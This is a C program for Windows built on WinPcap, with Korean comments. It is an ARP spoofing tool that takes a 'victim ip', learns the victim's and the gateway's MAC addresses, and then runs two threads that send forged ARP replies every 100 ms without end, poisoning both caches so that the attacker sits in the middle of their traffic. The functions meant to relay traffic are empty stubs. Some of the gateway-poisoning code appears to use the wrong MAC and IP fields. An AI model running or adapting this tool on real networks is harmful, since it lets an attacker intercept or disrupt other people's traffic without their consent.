#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")

#include "pcap.h"
#include <stdio.h>
#include <tchar.h>
#include <stdlib.h>
#include <windows.h>
#include <process.h>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <IPHlpApi.h>

#define ETH_HDRLEN 14      // Ethernet header length
#define ARP_HDRLEN 28      // ARP header length

#define ARPHRD_ETHER 1
#define ARP_OP_REQUEST 1
#define ARP_OP_REPLY 2

#define ETHER_ADDR_LEN 6

#define ETHERTYPE_IP 0x0800
#define ETHERTYPE_ARP 0x0806

typedef struct mac_address {
	u_char byte1;
	u_char byte2;
	u_char byte3;
	u_char byte4;
	u_char byte5;
	u_char byte6;
}mac;

typedef struct ether_header {
	unsigned char ether_dhost[ETHER_ADDR_LEN];
	unsigned char ether_shost[ETHER_ADDR_LEN];
	unsigned short ether_type;
}ETHER_HDR;

typedef struct ip_address {
	u_char byte1;
	u_char byte2;
	u_char byte3;
	u_char byte4;
}ip_address;

typedef struct arp_header {
	u_int16_t htype;
	u_int16_t ptype;
	u_int8_t hlen;
	u_int8_t plen;
	u_int16_t opcode;
	u_int8_t sender_mac[6];
	u_int8_t sender_ip[4];
	u_int8_t target_mac[6];
	u_int8_t target_ip[4];
}ARP_HDR;

typedef struct ip_header {
	u_char ver_ihl;
	u_char tos;
	u_short tlen;
	u_short identification;
	u_short flags_fo;
	u_char ttl;
	u_char proto;
	u_short crc;
	ip_address saddr;
	ip_address daddr;
	u_int op_pad;
}IP_HDR;

typedef struct spoofparam {
	pcap_t *pkt;
	u_int8_t *byteMAC[8];
	unsigned int IntMyip;
	u_int8_t *target_mac[8];
	unsigned int IntGateip;
	u_int8_t *gateway_mac[8];
	const char * target_ip;
}SPOOFPARAM;

// victim으로 부터 받은 패킷을 게이트웨이로 전송
unsigned int WINAPI RelayVictim2Gate(LPVOID lpParam) {
	// victim으로 부터 도착한 것이 맞는지 확인? 맥 어드레스
	return 0;
}

// gateway로부터 받은 패킷을 victim에게 전송
unsigned int WINAPI RelayGate2Victim(LPVOID lpParam) {
	// victim에게 가려고 한 패킷이 맞는지 확인
	return 0;
}


// gateway로부터 victim의 패킷을 받을 수 있도록 속이는 작업
unsigned int WINAPI spoofGateway(LPVOID lpParam) {
	// victim의 아이피 주소는 나의 맥 어드레스라고 속여야 함.
	SPOOFPARAM spoofdata = *(SPOOFPARAM*)lpParam;

	u_char poison_pkt[ETH_HDRLEN + ARP_HDRLEN];

	ETHER_HDR *ps_eth = (ETHER_HDR*)poison_pkt;
	memcpy(ps_eth->ether_dhost, *(spoofdata.target_mac), sizeof(ps_eth->ether_dhost));	// 도착지는 gateway mac
	memcpy(ps_eth->ether_shost, *(spoofdata.byteMAC), sizeof(ps_eth->ether_shost));		// 출발지는 byte mac
	ps_eth->ether_type = htons(ETHERTYPE_ARP);											// 보내는 패킷은 arp 패킷

	ARP_HDR *ps_arp = (ARP_HDR*)(poison_pkt + ETH_HDRLEN);
	ps_arp->htype = htons(ARPHRD_ETHER);
	ps_arp->ptype = htons(ETHERTYPE_IP);
	ps_arp->hlen = sizeof(mac);
	ps_arp->plen = sizeof(ip_address);
	ps_arp->opcode = htons(ARP_OP_REPLY);
	memcpy(ps_arp->sender_mac, *(spoofdata.byteMAC), sizeof(ps_arp->sender_mac));		// victim의 맥은 내 mac이야!
	*(unsigned int*)(ps_arp->sender_ip) = (unsigned int)inet_addr(spoofdata.target_ip); // victim ip로 속인다!!
	memcpy(ps_arp->target_mac, *(spoofdata.target_mac), sizeof(ps_arp->target_mac));		// 상대방에게 응답!, gateway mac
	*(unsigned int*)(ps_arp->target_ip) = (unsigned int)inet_addr(spoofdata.target_ip); // gateway ip 

	while (1) {
		if (pcap_sendpacket(spoofdata.pkt, poison_pkt, sizeof(poison_pkt)) != 0) {
			fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(spoofdata.pkt));
			return -1;
		}
		printf("send poison gateway packet!!\n");
		Sleep(100);
	}
	return 0;
}

// victim을 속이는 작업
unsigned int WINAPI spoofVictim(LPVOID lpParam) {
		
	SPOOFPARAM spoofdata = *(SPOOFPARAM*)lpParam;
	
	u_char poison_pkt[ETH_HDRLEN + ARP_HDRLEN];

	ETHER_HDR *ps_eth = (ETHER_HDR*)poison_pkt;
	memcpy(ps_eth->ether_dhost, *(spoofdata.target_mac), sizeof(ps_eth->ether_dhost)); // 도착지는 target mac
	memcpy(ps_eth->ether_shost, *(spoofdata.byteMAC), sizeof(ps_eth->ether_shost));	// 출발지는 byte mac
	ps_eth->ether_type = htons(ETHERTYPE_ARP);	// 보내는 패킷은 arp 패킷

	ARP_HDR *ps_arp = (ARP_HDR*)(poison_pkt + ETH_HDRLEN);
	ps_arp->htype = htons(ARPHRD_ETHER);
	ps_arp->ptype = htons(ETHERTYPE_IP);
	ps_arp->hlen = sizeof(mac);
	ps_arp->plen = sizeof(ip_address);
	ps_arp->opcode = htons(ARP_OP_REPLY);
	memcpy(ps_arp->sender_mac, *(spoofdata.byteMAC), sizeof(ps_arp->sender_mac));		// gateway의 맥은 내 mac이야!
	*(unsigned int*)(ps_arp->sender_ip) = spoofdata.IntGateip;						//gateway ip로 속인다!!
	memcpy(ps_arp->target_mac, *(spoofdata.target_mac), sizeof(ps_arp->target_mac));	// 상대방에게 응답! 
	*(unsigned int*)(ps_arp->target_ip) = (unsigned int)inet_addr(spoofdata.target_ip);

	while (1) {
		if (pcap_sendpacket(spoofdata.pkt, poison_pkt, sizeof(poison_pkt)) != 0) {
			fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(spoofdata.pkt));
			return -1;
		}
		printf("send poison packet!!\n");
		Sleep(100);
	}

}
int main(int argc, char *argv[])
{
	pcap_t* pkt;
	struct pcap_pkthdr *pkt_header;
	const u_char *pkt_data;
	pcap_if_t *dev;
	int res;
	int gate;

	char errbuf[PCAP_ERRBUF_SIZE];
	const char* target_ip = argv[1];

	// Local IP Address, Local MAC Address, Gateway를 얻어온다.  
	char *Myip = (char*)malloc(16);
	char *Gateway = (char*)malloc(16);
	char *Mymac = (char*)malloc(17);
	u_int8_t byteMAC[8];
	unsigned int IntMyip;
	u_int8_t target_mac[8];
	unsigned int IntMytarget;
	u_int8_t gateway_mac[8];
	unsigned int IntGateip;


	PIP_ADAPTER_INFO AdapterInfo;	// 어뎁터가 가지고 있는 정보를 저장
	PIP_ADAPTER_INFO pAdapter = NULL;
	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
	DWORD dwRetVal = 0;

	if (argc < 2) {
		fprintf(stderr, "Usage : send_arp <victim ip>\n");
		return -1;
	}

	IntMytarget = (unsigned int)inet_addr(target_ip);

	AdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));

	if (AdapterInfo == NULL) {
		printf("Error allocating memory needed to call GetAdaptersinfo\n");
		return 1;
	}

	if (GetAdaptersInfo(AdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
		free(AdapterInfo);
		AdapterInfo = (IP_ADAPTER_INFO *)malloc(ulOutBufLen);
		if (AdapterInfo == NULL) {
			printf("Error allocating memory needed to call GetAdaptersinfo\n");
			return 1;
		}
	}

	if ((dwRetVal = GetAdaptersInfo(AdapterInfo, &ulOutBufLen)) == NO_ERROR) {
		pAdapter = AdapterInfo;
	}

	sprintf(Myip, "%s", pAdapter->IpAddressList.IpAddress.String);
	sprintf(Gateway, "%s", pAdapter->GatewayList.IpAddress.String);
	sprintf(Mymac, "%02X:%02X:%02X:%02X:%02X:%02X",
		AdapterInfo->Address[0], AdapterInfo->Address[1],
		AdapterInfo->Address[2], AdapterInfo->Address[3],
		AdapterInfo->Address[4], AdapterInfo->Address[5]);
	memcpy(byteMAC, AdapterInfo->Address, sizeof(byteMAC));

	printf("IP address: \t%s\n", Myip);
	printf("Gateway: \t%s\n", Gateway);
	printf("MAC: \t%s\n", Mymac);
	free(AdapterInfo);

	IntMyip = (unsigned int)inet_addr(Myip);
	IntGateip = (unsigned int)inet_addr(Gateway);

	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL /* auth is not needed */, &dev, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs_ex: %s\n", errbuf);
		exit(1);
	}

	printf("%s\n", dev->name);


	if ((pkt = pcap_open(dev->name,        
		65536,          
		PCAP_OPENFLAG_PROMISCUOUS,    
		1,           
		NULL,           
		errbuf
	)) == NULL)
	{
		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", dev->name);
		pcap_freealldevs(dev);
		return -1;
	}

	printf("\nlistening on %s...\n", dev->description);

	// gate way를 얻어오는 용도로 사용 

	u_char gate_pkt[ETH_HDRLEN + ARP_HDRLEN];

	ETHER_HDR *gate_eth = (ETHER_HDR*)gate_pkt;
	memset(gate_eth->ether_dhost, 0xFF, sizeof(gate_eth->ether_dhost));
	memcpy(gate_eth->ether_shost, byteMAC, sizeof(gate_eth->ether_shost));
	gate_eth->ether_type = htons(ETHERTYPE_ARP);

	ARP_HDR *gate_arp = (ARP_HDR*)(gate_pkt + ETH_HDRLEN);
	gate_arp->htype = htons(ARPHRD_ETHER);
	gate_arp->ptype = htons(ETHERTYPE_IP);
	gate_arp->hlen = sizeof(mac);
	gate_arp->plen = sizeof(ip_address);
	gate_arp->opcode = htons(ARP_OP_REQUEST);
	memcpy(gate_arp->sender_mac, byteMAC, sizeof(gate_arp->sender_mac));
	*(unsigned int*)(gate_arp->sender_ip) = IntMyip;
	memset(gate_arp->target_mac, 0x00, sizeof(gate_arp->target_mac));
	*(unsigned int*)(gate_arp->target_ip) = IntGateip;

	int temp = 10;
	while (temp) {
		if (pcap_sendpacket(pkt, gate_pkt, sizeof(gate_pkt)) != 0) {
			fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(pkt));
			return -1;
		}
		printf("get mac send packet!!\n");
		temp--;
	}

	/* 상대방의 reply 패킷을 가져와서 mac address 획득하기 */

	while ((gate = pcap_next_ex(pkt, &pkt_header, &pkt_data)) >= 0) {
		if (gate == 0)
			continue;

		ETHER_HDR *gatearp = (ETHER_HDR*)pkt_data;

		if (ntohs(gatearp->ether_type) != ETHERTYPE_ARP) continue;
		ARP_HDR * gate_pkt = (ARP_HDR*)(pkt_data + ETH_HDRLEN);

		if (ntohs(gate_pkt->opcode) != ARP_OP_REPLY) continue;

		if ((*(unsigned int*)gate_pkt->sender_ip) == IntGateip) {
			memcpy(gateway_mac, gate_pkt->sender_mac, sizeof(target_mac));
			printf("get gateway_mac!!\n");
			break;
		}
	}

	u_char packet[ETH_HDRLEN + ARP_HDRLEN];

	ETHER_HDR *ether = (ETHER_HDR*)packet;
	memset(ether->ether_dhost, 0xFF, sizeof(ether->ether_dhost));
	memcpy(ether->ether_shost, byteMAC, sizeof(ether->ether_shost));
	ether->ether_type = htons(ETHERTYPE_ARP);

	ARP_HDR *arp = (ARP_HDR*)(packet + ETH_HDRLEN);
	arp->htype = htons(ARPHRD_ETHER);
	arp->ptype = htons(ETHERTYPE_IP);
	arp->hlen = sizeof(mac);
	arp->plen = sizeof(ip_address);
	arp->opcode = htons(ARP_OP_REQUEST);
	memcpy(arp->sender_mac, byteMAC, sizeof(arp->sender_mac));
	*(unsigned int*)(arp->sender_ip) = IntMyip;
	memset(arp->target_mac, 0x00, sizeof(arp->target_mac));
	*(unsigned int*)(arp->target_ip) = (unsigned int)inet_addr(target_ip);

	int temp2 = 50;
	while (temp2) {
		if (pcap_sendpacket(pkt, packet, sizeof(packet)) != 0) {
			fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(pkt));
			return -1;
		}
		printf("get mac send packet!!\n");
		temp2--;
	}

	/* 상대방의 reply 패킷을 가져와서 mac address 획득하기 */

	while ((res = pcap_next_ex(pkt, &pkt_header, &pkt_data)) >= 0) {
		if (res == 0)
			continue;

		ETHER_HDR *chkarp = (ETHER_HDR*)pkt_data;

		if (ntohs(chkarp->ether_type) != ETHERTYPE_ARP) continue;
		ARP_HDR * chkpkt = (ARP_HDR*)(pkt_data + ETH_HDRLEN);

		if (ntohs(chkpkt->opcode) != ARP_OP_REPLY) continue;

		if ((*(unsigned int*)chkpkt->sender_ip) == IntMytarget) {
			memcpy(target_mac, chkpkt->sender_mac, sizeof(target_mac));
			break;
		}
	}

	SPOOFPARAM sVictim;
	sVictim.pkt = pkt;
	(*sVictim.byteMAC) = byteMAC;
	sVictim.IntMyip = IntMyip;
	sVictim.IntGateip = IntGateip;
	sVictim.target_ip = target_ip;
	(*sVictim.target_mac) = target_mac;

	SPOOFPARAM sGateway;
	sGateway.pkt = pkt;
	(*sGateway.byteMAC) = byteMAC;
	sGateway.IntMyip = IntMyip;
	sGateway.IntGateip = IntGateip;
	sGateway.target_ip = target_ip;
	(*sGateway.target_mac) = target_mac;
	(*sGateway.gateway_mac) = gateway_mac;

	HANDLE hSpoofVictim;
	HANDLE hSpoofGateway;
	unsigned spoof_victim_id;
	unsigned spoof_gateway_id;

	hSpoofVictim = (HANDLE)_beginthreadex(NULL, 0, &spoofVictim, &sVictim, 0, &spoof_victim_id);
	hSpoofGateway = (HANDLE)_beginthreadex(NULL, 0, &spoofGateway, &sGateway, 0, &spoof_gateway_id);

	WaitForSingleObject(hSpoofVictim, INFINITE);
	WaitForSingleObject(hSpoofGateway, INFINITE);
	CloseHandle(hSpoofVictim);
	CloseHandle(hSpoofGateway);

	pcap_freealldevs(dev);

	free(Myip);
	free(Gateway);
	free(Mymac);

	return 0;
}